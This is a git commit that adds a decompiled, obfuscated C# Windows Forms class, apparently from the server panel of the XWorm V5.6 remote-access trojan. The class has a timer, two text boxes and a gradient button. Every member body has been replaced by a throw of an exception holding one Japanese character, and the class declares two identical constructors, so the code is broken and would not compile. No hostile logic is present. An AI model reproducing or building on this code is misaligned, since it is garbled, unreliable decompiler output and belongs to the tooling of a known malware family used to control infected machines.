39b1bb5bccabc130623f2ee49a6d9204c9a38cb8
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:46 +0400

    Forms62.cs

---
+++ XWorm V5.6/Server/Forms/Forms62.cs
@@ -0,0 +1,99 @@
+﻿using Guna.UI2.WinForms;
+using M95F4E5MF7905418B3E7M3BBMCM33E92;
+using Microsoft.VisualBasic.CompilerServices;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+
+namespace D938976EF0C9CAB410E2AD573255EDFA
+{
+  [DesignerGenerated]
+  public class V1B0A7VF02V00E8115CAE37DB277B27D : Form
+  {
+    internal virtual Timer Timer1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("み");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("ぇ");
+    }
+
+    internal virtual Guna2TextBox Guna2TextBox2
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("ぇ");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("ょ");
+    }
+
+    internal virtual Guna2TextBox Guna2TextBox1
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("や");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set => throw new Exception("ぞ");
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void V64D0DF24C42BV96921C1D0B577F9B40(object sender, EventArgs e) => throw new Exception("ゆ");
+
+    [DebuggerNonUserCode]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    protected override void Dispose(bool disposing)
+    {
+      try
+      {
+      }
+      finally
+      {
+label_2:
+        throw new Exception("り");
+      }
+      goto label_2;
+    }
+
+    [DebuggerStepThrough]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void VBV47B7FBA7EV92B67DF3E54F39A3C92() => throw new Exception("ボ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2GradientButton get_Guna2GradientButton1() => throw new Exception("ほ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Guna2GradientButton1(Guna2GradientButton WithEventsValue) => throw new Exception("ぃ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2TextBox get_Guna2TextBox1() => throw new Exception("ぁ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Guna2TextBox1(Guna2TextBox WithEventsValue) => throw new Exception("ぴ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual Guna2TextBox get_Guna2TextBox2() => throw new Exception("ポ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_Guna2TextBox2(Guna2TextBox WithEventsValue) => throw new Exception("さ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public V1B0A7VF02V00E8115CAE37DB277B27D() => throw new Exception("び");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void V62C0090A0VFC09A73F478VAE9026BDD(object sender, EventArgs e) => throw new Exception("す");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void F693F593EC3F86FB1BAA5DE27963F443(object sender, EventArgs e) => throw new Exception("わ");
+
+    static V1B0A7VF02V00E8115CAE37DB277B27D() => \u003CModule\u003E.SSB8B8B3575782111E87SA3B6E17ECE2 = new List<FE2B86A9D832C0656F97BF8FC7D65AE7>();
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public V1B0A7VF02V00E8115CAE37DB277B27D() => throw new Exception("ろ");
+  }
+}
